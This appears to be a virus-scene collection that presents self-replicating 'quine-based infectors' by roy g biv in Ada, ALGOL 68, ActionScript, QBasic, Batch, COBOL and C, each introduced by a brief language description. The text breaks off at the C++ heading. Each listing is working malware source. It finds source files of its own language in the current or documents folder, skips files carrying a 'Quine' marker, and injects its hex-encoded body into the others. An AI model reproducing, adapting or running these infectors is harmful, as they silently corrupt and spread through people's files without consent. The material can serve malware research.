
  [Note by SPTH: This document contains quine-based infectors in 32 different
   languages written by roy g biv between April and Octomber 2013.
   The languages are described in a few sentences (from wikipedia).
   Find the full archive in the binary directory.]
  
  
  
  

  *) ADA

     Ada is a structured, statically typed, imperative, wide-spectrum, and
     object-oriented high-level computer programming language, extended from
     Pascal and other languages. It has built-in language support for explicit
     concurrency, offering tasks, synchronous message passing, protected
     objects, and non-determinism.
    
     Quine-based infector was finished on 22.04.2013. 
 
 - - - - - - - - - - - - - - - - [ADA.Quine] - - - - - - - - - - - - - - - - 
with gnat.directory_operations,ada.text_io,ada.strings.unbounded,ada.strings.equal_case_insensitive;use gnat.directory_operations,ada.text_io,ada.strings.unbounded,ada.strings;

procedure quine is

a:stringb:dir_type;c,g:string(1..260);d,h,i,l,m:natural;e,j,k:unbounded_string;f:file_type;

begin

open(b,".");loop read(b,c,d);exit when d=0;if d>4 then if equal_case_insensitive(c(d-3..d),".adb")then e:=null_unbounded_string;open(f,in_file,c(1..d));i:=0;while not end_of_file(f)and i=0 loop get_line(f,g,h);i:=index(to_unbounded_string(g(1..h)),"Quine");append(e,g(1..h)&character'val(10));end loop;close(f);if i=0 then j:=e;loop h:=index(j,"end ");exit when h=0;i:=index(unbounded_slice(j,h,length(j)),";");k:=unbounded_slice(j,h+4,h+i-2);l:=index(e,"procedure "&to_string(k));exit when l>0;j:=unbounded_slice(j,h+i,length(j));end loop;if h>0 then j:=unbounded_slice(e,l,length(e));h:=index(j,"begin")-2;i:=index(j,to_string("end "&k))-2;open(f,out_file,c(1..d));d:=1;while d<a'length loop m:=character'pos(a(d+1));put(f,character'val(character'pos(a(d))*16+m-m/64*7-816));d:=d+2;if d=353 then put(f,to_string(unbounded_slice(e,1,l+h)));elsif d=375 then put(f,a);elsif d=545 then put(f,to_string(unbounded_slice(e,l+h,l+i)));end if;end loop;put(f,to_string(unbounded_slice(e,l+i+1,length(e))));close(f);end if;end if;end if;end if;end loop;close(b);exception when error:others=>return;--Quine - roy g biv 22/04/13

end quine;
 - - - - - - - - - - - - - - - - [ADA.Quine] - - - - - - - - - - - - - - - - 





  *) Algol

     ALGOL 68 (short for ALGOrithmic Language 1968) is an imperative computer
     programming language that was conceived as a successor to the ALGOL 60
     programming language, designed with the goal of a much wider scope of
     application and more rigorously defined syntax and semantics.

     The contributions of ALGOL 68 to the field of computer science has been
     deep, wide ranging and enduring, although many of these contributions
     were only publicly identified when they had reappeared in subsequently
     developed programming languages.

     Quine-based infector was finished on 27.04.2013. 

 - - - - - - - - - - - - - - - - [ALG.Quine] - - - - - - - - - - - - - - - -
BEGIN

STRINGab:=";STRINGa:="+REPR(34)+a,f,j;INTd;FORcBY2TO UPBaDOd:=ABSa[c+1];b+:=REPR(ABSa[c]*16+d-ENTIER(d/64)*7-816)OD;[]STRINGe=getdirectory(".");FORcTO UPBeDO IF UPBe[c]>4THENf:=e[c][UPBe[c]-3:];FORgTO UPBfDO IF ABSf[g]>64&ABSf[g]<91THENf[g]:=REPR(ABSf[g]+32)FI OD;IFf=".a68"THEN FILEh;IFopen(h,e[c],standinchannel)=0THENonlogicalfileend(h,(REF FILEe)BOOL:i);STRINGl;BOOLk;WHILEgetf(h,($gl$,j));k:=stringinstring("Quine",NIL,j);~kDOl+:=j+REPR(ABS10)OD;i:SKIP;close(h);IFk=FALSE THEN IFopen(h,e[c],standoutchannel)=0THENd:=UPBl-3;WHILEl[d+1:d+3]/="END"DOd-:=1OD;put(h,(l[:d],b,l[d+1:]))FI;close(h)FI FI FI FI OD#Quine - roy g biv 27/04/13#

END
 - - - - - - - - - - - - - - - - [ALG.Quine] - - - - - - - - - - - - - - - -  





  *) ActionScript

     ActionScript is an object-oriented language originally developed by
     Macromedia Inc. (now owned by Adobe Systems). It is a dialect of
     ECMAScript (meaning it is a superset of the syntax and semantics of the
     language more widely known as JavaScript), and is used primarily for the
     development of websites and software targeting the Adobe Flash Player
     platform, used on Web pages in the form of embedded SWF files. The
     language itself is open-source in that its specification is offered free
     of charge and both an open source compiler (as part of Apache Flex)
     and open source virtual machine (Mozilla Tamarin) are available.
     
     Quine-based infector was finished on 09.10.2013.    

 - - - - - - - - - - - - - - - - [AS.Quine] - - - - - - - - - - - - - - - -
package
{
	import flash.display.Sprite;
	public class quine extends Sprite
	{
		function quine()
		{
			{
				var a:Stringvar b:String="{var a:String=\""+a;var c:int;for(c=0;c<a.length;c+=2)b+=String.fromCharCode(parseInt(a.substr(c,2),16));import flash.filesystem.*;var d:Array=File.documentsDirectory.getDirectoryListing();for(c=0;c<d.length;c++)if(d[c].url.substring(d[c].url.length-3).toLowerCase()==".as")try{var e:FileStream=new FileStream();e.open(d[c],"read");var f:String=e.readUTFBytes(e.bytesAvailable);e.close();var g:int=f.lastIndexOf("}",f.lastIndexOf("}",f.lastIndexOf("}")-1)-1);if(f.charAt(g-1)!='/'){e.open(d[c],"write");e.writeUTFBytes(f.substr(0,g)+b+f.substr(g));e.close();}}catch(z){}}/*Quine - roy g biv 09/10/13*/}
	}
}
 - - - - - - - - - - - - - - - - [AS.Quine] - - - - - - - - - - - - - - - -





  *) QBasic

     QBasic (Microsoft Quick Beginners All purpose Symbolic Instruction Code)
     is an IDE and interpreter for a variant of the BASIC programming language
     which is based on QuickBASIC. Code entered into the IDE is compiled to
     an intermediate form, and this intermediate form is immediately
     interpreted on demand within the IDE.[1] It can run under nearly all
     versions of DOS and Windows, or through DOSBox/DOSEMU, on Linux and
     FreeBSD. For its time, QBasic provided a state-of-the-art IDE, including
     a debugger with features such as on-the-fly expression evaluation and
     code modification.

     Like QuickBASIC, but unlike earlier versions of Microsoft BASIC, QBasic
     is a structured programming language, supporting constructs such as
     subroutines and while loops.
     
     Quine-based infector was finished on 24.05.2013.        

 - - - - - - - - - - - - - - - - [QBAS.Quine] - - - - - - - - - - - - - - - -
A$="223A42243D43485224283130292B2241243D222B43485224283334292B41243A464F5220413D3120544F204C454E284124295354455020323A42243D42242B434852242856414C28222648222B4D4944242841242C412C322929293A4E4558543A5348454C4C224449522F42202A2E4241533E52223A4F4E204552524F5220474F544F20473A4F50454E2249222C312C2252223A5748494C45204E4F5420454F462831293A4C494E4520494E50555423312C41243A4F50454E2249222C322C41243A413D303A5748494C45204E4F5420454F46283229414E4420413D303A4C494E4520494E50555423322C43243A413D494E5354522843242C225175696E6522293A57454E443A434C4F534520320A494620413D305448454E0A4F50454E2241222C322C41243A5052494E5423322C42243A434C4F534520320A454E4449463A57454E440A473A454E44275175696E65202D20726F792067206269762032342F30352F3133":B$=CHR$(10)+"A$="+CHR$(34)+A$:FOR A=1 TO LEN(A$)STEP 2:B$=B$+CHR$(VAL("&H"+MID$(A$,A,2))):NEXT:SHELL"DIR/B *.BAS>R":ON ERROR GOTO G:OPEN"I",1,"R":WHILE NOT EOF(1):LINE INPUT#1,A$:OPEN"I",2,A$:A=0:WHILE NOT EOF(2)AND A=0:LINE INPUT#2,C$:A=INSTR(C$,"Quine"):WEND:CLOSE 2
IF A=0THEN
OPEN"A",2,A$:PRINT#2,B$:CLOSE 2
ENDIF:WEND
G:END'Quine - roy g biv 24/05/13
 - - - - - - - - - - - - - - - - [QBAS.Quine] - - - - - - - - - - - - - - - -





  *) Batch

     In DOS, OS/2, and also Microsoft Windows, batch file is the name given to
     a type of script file, a text file containing a series of commands to be
     executed by the command interpreter.

     A batch file may contain any command the interpreter accepts
     interactively at the command prompt. A batch file may also have
     constructs (IF, GOTO, Labels, CALL, etc.) that enable conditional
     branching and looping within the batch file.

     Quine-based infector was finished on 19.09.2013.

 - - - - - - - - - - - - - - - - [BAT.Quine] - - - - - - - - - - - - - - - -
@REM QUINE - ROY G BIV 19/09/13
@ECHO OFF
SETLOCAL ENABLEDELAYEDEXPANSION

SET B= R"#$RR'()*+,-./0123456789:;R=R?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]R_`abcdefghijklmnopqrstuvwxyz{R}~
FOR /L %%A IN (0,2,1516)DO CALL:E %%A
FOR %%A IN (*.BAT)DO IF %%~ZA LSS 60000 CALL:I %%A
ENDLOCAL
@ECHO ON
@GOTO:K
:E
IF %1==160 SET F=!F!%A%
SET /A G=0x!A:~%1,2!
SET /A H=G-32
IF %G%==10 (
SET F=!F!^

)ELSE IF %H%==1 (SET F=!F!^^!
)ELSE IF %H%==5 (SET F=!F!%%
)ELSE IF %H%==6 (SET F=!F!^&
)ELSE IF %H%==28 (SET F=!F!^<
)ELSE IF %H%==30 (SET F=!F!^>
)ELSE IF %H%==62 (SET F=!F!^^^^
)ELSE IF %H%==92 (SET F=!F!^|
)ELSE SET F=!F!!B:~%H%,1!
GOTO:EOF
:I
FOR /F "TOKENS=*" %%B IN (%1)DO (
SET J=%%B
IF "!J:~5,5!" NEQ "QUINE" (
REN %1 R
ECHO !F!>%1
TYPE R>>%1
DEL R
)
GOTO:EOF
)
:K
 - - - - - - - - - - - - - - - - [BAT.Quine] - - - - - - - - - - - - - - - -





  *) COBOL
    
     COBOL is one of the oldest programming languages, primarily designed by
     Grace Hopper. Its name is an acronym for COmmon Business-Oriented
     Language, defining its primary domain in business, finance, and
     administrative systems for companies and governments.
     
     Quine-based infector was finished on 01.09.2013.
     
 - - - - - - - - - - - - - - - - [CBL.Quine] - - - - - - - - - - - - - - - -
010913 IDENTIFICATION DIVISION.
010913 PROGRAM-ID. QUINE.
010913 ENVIRONMENT DIVISION.
010913 INPUT-OUTPUT SECTION.
010913 FILE-CONTROL.
010913 SELECT A ASSIGN TO'VICTIM.CBL'
010913 ORGANIZATION IS LINE SEQUENTIAL.
010913 SELECT E ASSIGN TO'R'
010913 ORGANIZATION IS LINE SEQUENTIAL.
010913 DATA DIVISION.
010913 FILE SECTION.
010913 FD A
010913 RECORD CONTAINS 72 CHARACTERS.
010913 01 B.
010913 02 C PIC X(6).
010913 02 D PIC X(66).
010913 FD E
010913 RECORD CONTAINS 72 CHARACTERS.
010913 01 F.
010913 02 G PIC X(6).
010913 02 H PIC X(66).
010913 WORKING-STORAGE SECTION.
010913 01 I PIC 9(6).
010913 01 J PIC 9.
010913 01 K PIC 9.
010913 01 L PIC 999.
010913 01 M PIC 999.
010913 01 N PIC 999.
010913 01 O PIC 9(6).
010913 01 P PIC 999.
010913 01 Q PIC 999.
010913 01 R PIC 9(5).
010913 01 S PIC 999.
010913 01 T PIC 999.
010913 01 U PIC X(59).
010913 01 V PIC X(9098).
010913 01 W PIC 99.
010913 PROCEDURE DIVISION.
010913 OPEN INPUT A
010913 SET I TO 0
010913 SET J TO 0
010913 SET K TO 0
010913 SET M TO 0
010913 SET N TO 0
010913 SET O TO 0
010913 SET P TO 0
010913 SET Q TO 0
010913 SET R TO 0
010913 SET S TO 0
010913 PERFORM UNTIL J=1 OR K>0
010913 READ A
010913 AT END SET J TO 1
010913 END-READ
010913 ADD 1 TO I
010913 INSPECT D TALLYING K FOR ALL'QUINE'
010913 IF D(1:1)=' 'THEN
010913 SET L TO 0
010913 INSPECT D TALLYING L FOR ALL'DIVISION.'
010913 IF L=1 THEN
010913 INSPECT D TALLYING L FOR ALL'ENVIRONMENT'
010913 IF L=2 THEN SET M TO I
010913 ELSE
010913 INSPECT D TALLYING L FOR ALL'DATA'
010913 IF L=2 THEN SET N TO I
010913 ELSE
010913 INSPECT D TALLYING L FOR ALL'PROCEDURE'
010913 IF L=2 THEN SET O TO I
010913 END-IF
010913 END-IF
010913 END-IF
010913 ELSE
010913 INSPECT D TALLYING L FOR ALL'SECTION.'
010913 IF L=1 THEN
010913 INSPECT D TALLYING L FOR ALL'INPUT-OUTPUT'
010913 IF L=2 THEN SET P TO I
010913 ELSE
010913 INSPECT D TALLYING L FOR ALL'FILE'
010913 IF L=2 THEN SET Q TO I
010913 ELSE
010913 INSPECT D TALLYING L FOR ALL'WORKING-STORAGE'
010913 IF L=2 THEN SET R TO I
010913 END-IF
010913 END-IF
010913 END-IF
010913 ELSE
010913 INSPECT D TALLYING L FOR ALL'FILE-CONTROL.'
010913 IF L=1 THEN SET S TO I
010913 END-PERFORM
010913 CLOSE A
010913 IF K=0 AND O>0 THEN
010913 OPEN INPUT A
010913 OPEN OUTPUT E
010913 SET L TO 1
010913 SET T TO I
010913 IF M>0 THEN
010913 PERFORM VARYING L FROM L BY 1 UNTIL L>M
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 IF P>0 THEN
010913 PERFORM VARYING L FROM L BY 1 UNTIL L>P
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 IF S>0 THEN
010913 PERFORM VARYING L FROM L BY 1 UNTIL L>S
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 END-IF
010913 END-IF
010913 ELSE
010913 SET M TO O
010913 IF N>0 THEN SET M TO N
010913 END-IF
010913 PERFORM VARYING L FROM L BY 1 UNTIL L=M
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 SET H TO' ENVIRONMENT DIVISION.'
010913 WRITE F
010913 ADD 1 TO T
010913 END-IF
010913 IF S=0 THEN
010913 IF P=0 THEN
010913 SET H TO' INPUT-OUTPUT SECTION.'
010913 WRITE F
010913 ADD 1 TO T
010913 END-IF
010913 SET H TO' FILE-CONTROL.'
010913 WRITE F
010913 ADD 1 TO T
010913 END-IF
010913 SET H TO" SELECT A ASSIGN TO'VICTIM.CBL'"
010913 WRITE F
010913 SET U TO' ORGANIZATION IS LINE SEQUENTIAL.'
010913 SET H TO U
010913 WRITE F
010913 SET H TO" SELECT E ASSIGN TO'R'"
010913 WRITE F
010913 SET H TO U
010913 WRITE F
010913 ADD 4 TO T
010913 IF Q>0 THEN
010913 PERFORM VARYING L FROM L BY 1 UNTIL L>Q
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 ELSE
010913 IF N>0 THEN
010913 PERFORM VARYING L FROM L BY 1 UNTIL L>N
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 ELSE
010913 PERFORM VARYING L FROM L BY 1 UNTIL L=O
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 SET H TO' DATA DIVISION.'
010913 WRITE F
010913 ADD 1 TO T
010913 END-IF
010913 SET H TO' FILE SECTION.'
010913 WRITE F
010913 ADD 1 TO T
010913 END-IF
010913 SET H TO' FD A'
010913 WRITE F
010913 SET U TO' RECORD CONTAINS 72 CHARACTERS.'
010913 SET H TO U
010913 WRITE F
010913 SET H TO' 01 B.'
010913 WRITE F
010913 SET H TO' 02 C PIC X(6).'
010913 WRITE F
010913 SET H TO' 02 D PIC X(66).'
010913 WRITE F
010913 SET H TO' FD E'
010913 WRITE F
010913 SET H TO U
010913 WRITE F
010913 SET H TO' 01 F.'
010913 WRITE F
010913 SET H TO' 02 G PIC X(6).'
010913 WRITE F
010913 SET H TO' 02 H PIC X(66).'
010913 WRITE F
010913 ADD 10 TO T
010913 IF R>0 THEN
010913 PERFORM VARYING L FROM L BY 1 UNTIL L>R
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 ELSE
010913 PERFORM VARYING L FROM L BY 1 UNTIL L=O
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 SET H TO' WORKING-STORAGE SECTION.'
010913 ADD 1 TO T
010913 WRITE F
010913 END-IF
010913 SET H TO' 01 I PIC 9(6).'
010913 WRITE F
010913 SET H TO' 01 J PIC 9.'
010913 WRITE F
010913 SET H TO' 01 K PIC 9.'
010913 WRITE F
010913 SET H TO' 01 L PIC 999.'
010913 WRITE F
010913 SET H TO' 01 M PIC 999.'
010913 WRITE F
010913 SET H TO' 01 N PIC 999.'
010913 WRITE F
010913 SET H TO' 01 O PIC 9(6).'
010913 WRITE F
010913 SET H TO' 01 P PIC 999.'
010913 WRITE F
010913 SET H TO' 01 Q PIC 999.'
010913 WRITE F
010913 SET H TO' 01 R PIC 9(5).'
010913 WRITE F
010913 SET H TO' 01 S PIC 999.'
010913 WRITE F
010913 SET H TO' 01 T PIC 999.'
010913 WRITE F
010913 SET H TO' 01 U PIC X(59).'
010913 WRITE F
010913 SET H TO' 01 V PIC X(9098).'
010913 WRITE F
010913 SET H TO' 01 W PIC 99.'
010913 WRITE F
010913 ADD 15 TO T
010913 PERFORM VARYING L FROM L BY 1 UNTIL L>O
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 SET V TO'204F50454E20494E50555420410A20534554204920544F20300A2053
010913-'4554204A20544F20300A20534554204B20544F20300A20534554204D20544F20
010913-'300A20534554204E20544F20300A20534554204F20544F20300A205345542050
010913-'20544F20300A20534554205120544F20300A20534554205220544F20300A2053
010913-'4554205320544F20300A20504552464F524D20554E54494C204A3D31204F5220
010913-'4B3E300A205245414420410A20415420454E4420534554204A20544F20310A20
010913-'454E442D524541440A20414444203120544F20490A20494E5350454354204420
010913-'54414C4C59494E47204B20464F5220414C4C275155494E45270A204946204428
010913-'313A31293D2720275448454E0A20534554204C20544F20300A20494E53504543
010913-'5420442054414C4C59494E47204C20464F5220414C4C274449564953494F4E2E
010913-'270A204946204C3D31205448454E0A20494E535045435420442054414C4C5949
010913-'4E47204C20464F5220414C4C27454E5649524F4E4D454E54270A204946204C3D
010913-'32205448454E20534554204D20544F20490A20454C53450A20494E5350454354
010913-'20442054414C4C59494E47204C20464F5220414C4C2744415441270A20494620
010913-'4C3D32205448454E20534554204E20544F20490A20454C53450A20494E535045
010913-'435420442054414C4C59494E47204C20464F5220414C4C2750524F4345445552
010913-'45270A204946204C3D32205448454E20534554204F20544F20490A20454E442D
010913-'49460A20454E442D49460A20454E442D49460A20454C53450A20494E53504543
010913-'5420442054414C4C59494E47204C20464F5220414C4C2753454354494F4E2E27
010913-'0A204946204C3D31205448454E0A20494E535045435420442054414C4C59494E
010913-'47204C20464F5220414C4C27494E5055542D4F5554505554270A204946204C3D
010913-'32205448454E20534554205020544F20490A20454C53450A20494E5350454354
010913-'20442054414C4C59494E47204C20464F5220414C4C2746494C45270A20494620
010913-'4C3D32205448454E20534554205120544F20490A20454C53450A20494E535045
010913-'435420442054414C4C59494E47204C20464F5220414C4C27574F524B494E472D
010913-'53544F52414745270A204946204C3D32205448454E20534554205220544F2049
010913-'0A20454E442D49460A20454E442D49460A20454E442D49460A20454C53450A20
010913-'494E535045435420442054414C4C59494E47204C20464F5220414C4C2746494C
010913-'452D434F4E54524F4C2E270A204946204C3D31205448454E2053455420532054
010913-'4F20490A20454E442D504552464F524D0A20434C4F534520410A204946204B3D
010913-'3020414E44204F3E30205448454E0A204F50454E20494E50555420410A204F50
010913-'454E204F555450555420450A20534554204C20544F20310A2053455420542054
010913-'4F20490A204946204D3E30205448454E0A20504552464F524D2056415259494E
010913-'47204C2046524F4D204C204259203120554E54494C204C3E4D0A205245414420
010913-'410A20534554204620544F20420A20575249544520460A20454E442D50455246
010913-'4F524D0A20494620503E30205448454E0A20504552464F524D2056415259494E
010913-'47204C2046524F4D204C204259203120554E54494C204C3E500A205245414420
010913-'410A20534554204620544F20420A20575249544520460A20454E442D50455246
010913-'4F524D0A20494620533E30205448454E0A20504552464F524D2056415259494E
010913-'47204C2046524F4D204C204259203120554E54494C204C3E530A205245414420
010913-'410A20534554204620544F20420A20575249544520460A20454E442D50455246
010913-'4F524D0A20454E442D49460A20454E442D49460A20454C53450A20534554204D
010913-'20544F204F0A204946204E3E30205448454E20534554204D20544F204E0A2045
010913-'4E442D49460A20504552464F524D2056415259494E47204C2046524F4D204C20
010913-'4259203120554E54494C204C3D4D0A205245414420410A20534554204620544F
010913-'20420A20575249544520460A20454E442D504552464F524D0A20534554204820
010913-'544F2720454E5649524F4E4D454E54204449564953494F4E2E270A2057524954
010913-'4520460A20414444203120544F20540A20454E442D49460A20494620533D3020
010913-'5448454E0A20494620503D30205448454E0A20534554204820544F2720494E50
010913-'55542D4F55545055542053454354494F4E2E270A20575249544520460A204144
010913-'44203120544F20540A20454E442D49460A20534554204820544F272046494C45
010913-'2D434F4E54524F4C2E270A20575249544520460A20414444203120544F20540A
010913-'20454E442D49460A20534554204820544F222053454C45435420412041535349
010913-'474E20544F2756494354494D2E43424C27220A20575249544520460A20534554
010913-'205520544F27204F5247414E495A4154494F4E204953204C494E452053455155
010913-'454E5449414C2E270A20534554204820544F20550A20575249544520460A2053
010913-'4554204820544F222053454C45435420452041535349474E20544F275227220A
010913-'20575249544520460A20534554204820544F20550A20575249544520460A2041
010913-'4444203420544F20540A20494620513E30205448454E0A20504552464F524D20
010913-'56415259494E47204C2046524F4D204C204259203120554E54494C204C3E510A
010913-'205245414420410A20534554204620544F20420A20575249544520460A20454E
010913-'442D504552464F524D0A20454C53450A204946204E3E30205448454E0A205045
010913-'52464F524D2056415259494E47204C2046524F4D204C204259203120554E5449
010913-'4C204C3E4E0A205245414420410A20534554204620544F20420A205752495445
010913-'20460A20454E442D504552464F524D0A20454C53450A20504552464F524D2056
010913-'415259494E47204C2046524F4D204C204259203120554E54494C204C3D4F0A20
010913-'5245414420410A20534554204620544F20420A20575249544520460A20454E44
010913-'2D504552464F524D0A20534554204820544F272044415441204449564953494F
010913-'4E2E270A20575249544520460A20414444203120544F20540A20454E442D4946
010913-'0A20534554204820544F272046494C452053454354494F4E2E270A2057524954
010913-'4520460A20414444203120544F20540A20454E442D49460A2053455420482054
010913-'4F272046442041270A20575249544520460A20534554205520544F2720524543
010913-'4F524420434F4E5441494E5320373220434841524143544552532E270A205345
010913-'54204820544F20550A20575249544520460A20534554204820544F2720303120
010913-'422E270A20575249544520460A20534554204820544F27203032204320504943
010913-'20582836292E270A20575249544520460A20534554204820544F272030322044
010913-'205049432058283636292E270A20575249544520460A20534554204820544F27
010913-'2046442045270A20575249544520460A20534554204820544F20550A20575249
010913-'544520460A20534554204820544F2720303120462E270A20575249544520460A
010913-'20534554204820544F2720303220472050494320582836292E270A2057524954
010913-'4520460A20534554204820544F272030322048205049432058283636292E270A
010913-'20575249544520460A2041444420313020544F20540A20494620523E30205448
010913-'454E0A20504552464F524D2056415259494E47204C2046524F4D204C20425920
010913-'3120554E54494C204C3E520A205245414420410A20534554204620544F20420A
010913-'20575249544520460A20454E442D504552464F524D0A20454C53450A20504552
010913-'464F524D2056415259494E47204C2046524F4D204C204259203120554E54494C
010913-'204C3D4F0A205245414420410A20534554204620544F20420A20575249544520
010913-'460A20454E442D504552464F524D0A20534554204820544F2720574F524B494E
010913-'472D53544F524147452053454354494F4E2E270A20414444203120544F20540A
010913-'20575249544520460A20454E442D49460A20534554204820544F272030312049
010913-'2050494320392836292E270A20575249544520460A20534554204820544F2720
010913-'3031204A2050494320392E270A20575249544520460A20534554204820544F27
010913-'203031204B2050494320392E270A20575249544520460A20534554204820544F
010913-'27203031204C20504943203939392E270A20575249544520460A205345542048
010913-'20544F27203031204D20504943203939392E270A20575249544520460A205345
010913-'54204820544F27203031204E20504943203939392E270A20575249544520460A
010913-'20534554204820544F27203031204F2050494320392836292E270A2057524954
010913-'4520460A20534554204820544F27203031205020504943203939392E270A2057
010913-'5249544520460A20534554204820544F27203031205120504943203939392E27
010913-'0A20575249544520460A20534554204820544F27203031205220504943203928
010913-'35292E270A20575249544520460A20534554204820544F272030312053205049
010913-'43203939392E270A20575249544520460A20534554204820544F272030312054
010913-'20504943203939392E270A20575249544520460A20534554204820544F272030
010913-'312055205049432058283539292E270A20575249544520460A20534554204820
010913-'544F2720303120562050494320582839303938292E270A20575249544520460A
010913-'20534554204820544F272030312057205049432039392E270A20575249544520
010913-'460A2041444420313520544F20540A20504552464F524D2056415259494E4720
010913-'4C2046524F4D204C204259203120554E54494C204C3E4F0A205245414420410A
010913-'20534554204620544F20420A20575249544520460A20454E442D504552464F52
010913-'4D0A20534554205620544F27270A20534554205520544F272021222324252627
010913-'2728292A2B2C2D2E2F303132333435363738393A3B3C3D3E3F40414243444546
010913-'4748494A4B4C4D4E4F505152535455560A2D275758595A270A20534554205720
010913-'544F20310A20504552464F524D2056415259494E47204F2046524F4D20312042
010913-'59203120554E54494C204F3E4C454E475448204F4620560A20534554204D2054
010913-'4F2056284F3A31290A204D554C5449504C59203136204259204D0A2041444420
010913-'3120544F204F0A20534554205020544F2056284F3A31290A204556414C554154
010913-'452056284F3A31290A205748454E274127534554205020544F2031300A205748
010913-'454E274227534554205020544F2031310A205748454E27432753455420502054
010913-'4F2031320A205748454E274427534554205020544F2031330A205748454E2745
010913-'27534554205020544F2031340A205748454E274627534554205020544F203135
010913-'0A20454E442D4556414C554154450A20414444205020544F204D0A204946204D
010913-'3D3130205448454E0A20534554204828573A29544F205350414345530A205752
010913-'49544520460A20414444203120544F20540A20534554205720544F20310A2045
010913-'4C53450A2053554254524143542033312046524F4D204D0A2053455420482857
010913-'3A3129544F2055284D3A31290A20414444203120544F20570A204946204F3D36
010913-'393932205448454E0A20534554204A20544F20300A20534554205220544F2031
010913-'0A20504552464F524D20554E54494C204A3D310A20534554204828573A312954
010913-'4F205628523A31290A20414444203120544F20570A20414444203120544F2052
010913-'0A20494620523E4C454E475448204F462056205448454E20534554204A20544F
010913-'20310A20454C534520494620573D3637205448454E0A20575249544520460A20
010913-'414444203120544F20540A20534554204828313A3229544F222D27220A205345
010913-'54205720544F20330A20454E442D504552464F524D0A20454E442D504552464F
010913-'524D0A20494620573E32205448454E20575249544520460A20454E442D49460A
010913-'20534554204828313A3129544F2720270A20504552464F524D2056415259494E
010913-'47204C2046524F4D204C204259203120554E54494C204C3D490A205245414420
010913-'410A20534554204620544F20420A20575249544520460A20454E442D50455246
010913-'4F524D0A20434C4F534520450A20434C4F534520410A204F50454E20494E5055
010913-'5420450A204F50454E204F555450555420410A20534554204C20544F20310A20
010913-'504552464F524D2056415259494E47204C2046524F4D204C204259203120554E
010913-'54494C204C3D540A205245414420450A20534554204220544F20460A20575249
010913-'544520420A20454E442D504552464F524D0A20434C4F534520410A20434C4F53
010913-'4520450A20454E442D49462E0A2A5155494E45202D20524F5920472042495620
010913-'30312F30392F31330A'
010913 SET U TO' !"#$%&''()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUV
010913-'WXYZ'
010913 SET W TO 1
010913 PERFORM VARYING O FROM 1 BY 1 UNTIL O>LENGTH OF V
010913 SET M TO V(O:1)
010913 MULTIPLY 16 BY M
010913 ADD 1 TO O
010913 SET P TO V(O:1)
010913 EVALUATE V(O:1)
010913 WHEN'A'SET P TO 10
010913 WHEN'B'SET P TO 11
010913 WHEN'C'SET P TO 12
010913 WHEN'D'SET P TO 13
010913 WHEN'E'SET P TO 14
010913 WHEN'F'SET P TO 15
010913 END-EVALUATE
010913 ADD P TO M
010913 IF M=10 THEN
010913 SET H(W:)TO SPACES
010913 WRITE F
010913 ADD 1 TO T
010913 SET W TO 1
010913 ELSE
010913 SUBTRACT 31 FROM M
010913 SET H(W:1)TO U(M:1)
010913 ADD 1 TO W
010913 IF O=6992 THEN
010913 SET J TO 0
010913 SET R TO 1
010913 PERFORM UNTIL J=1
010913 SET H(W:1)TO V(R:1)
010913 ADD 1 TO W
010913 ADD 1 TO R
010913 IF R>LENGTH OF V THEN SET J TO 1
010913 ELSE IF W=67 THEN
010913 WRITE F
010913 ADD 1 TO T
010913 SET H(1:2)TO"-'"
010913 SET W TO 3
010913 END-PERFORM
010913 END-PERFORM
010913 IF W>2 THEN WRITE F
010913 END-IF
010913 SET H(1:1)TO' '
010913 PERFORM VARYING L FROM L BY 1 UNTIL L=I
010913 READ A
010913 SET F TO B
010913 WRITE F
010913 END-PERFORM
010913 CLOSE E
010913 CLOSE A
010913 OPEN INPUT E
010913 OPEN OUTPUT A
010913 SET L TO 1
010913 PERFORM VARYING L FROM L BY 1 UNTIL L=T
010913 READ E
010913 SET B TO F
010913 WRITE B
010913 END-PERFORM
010913 CLOSE A
010913 CLOSE E
010913 END-IF.
010913*QUINE - ROY G BIV 01/09/13
 - - - - - - - - - - - - - - - - [CBL.Quine] - - - - - - - - - - - - - - - -





  *) C
  
     In computing, C is a general-purpose programming language initially
     developed by Dennis Ritchie between 1969 and 1973 at AT&T Bell Labs. Like
     most imperative languages in the ALGOL tradition, C has facilities for
     structured programming and allows lexical variable scope and recursion,
     while a static type system prevents many unintended operations. Its
     design provides constructs that map efficiently to typical machine
     instructions, and therefore it has found lasting use in applications that
     had formerly been coded in assembly language, most notably system
     software like the Unix computer operating system.

     Quine-based infector was finished on 17.04.2013.
     
 - - - - - - - - - - - - - - - - [C.Quine] - - - - - - - - - - - - - - - -
void main(void)
{

{char*af;
#include<io.h>
#include<malloc.h>
#include<sys/stat.h>
struct _finddata_t b;long c,e,g;if((c=_findfirst("*.c",&b))+1){do{int d,i=0,j=0;if(f=malloc(e=filelength(d=open(b.name,512)))){g=read(d,f,e);close(d);while(f[--g]!='}');if(f[g-1]!='/'){struct stat h;stat(b.name,&h);chmod(b.name,200);if((d=open(b.name,513))>0){write(d,f,g);while(a[++i]);for(;j<i;j+=2){*f=a[j]*16+a[j+1]-a[j+1]/64*7-48;write(d,f,1);if(j==16)write(d,a,i);}write(d,f+g,e-g);close(d);}chmod(b.name,h.st_mode);}free(f);}}while(!_findnext(c,&b));_findclose(c);}}/*Quine - roy g biv 17/04/13*/}

 - - - - - - - - - - - - - - - - [C.Quine] - - - - - - - - - - - - - - - -





  *) C++
    
     C++ is a programming language that is general purpose, statically typed,
     free-form, multi-paradigm and compiled. It is regarded as an
     intermediate-level language, as it comprises both high-level and
     low-level language features. Developed by Bjarne Stroustrup starting in
     1979 at Bell Labs, C++ was originally named C with Classes, adding object
     oriented features, such as classes, and other enhancements to the C
     programming language. The language was renamed C++ in 1983, as a pun
     involving the increment operator.

     Quine-based infector was finished on 01.09.2013.

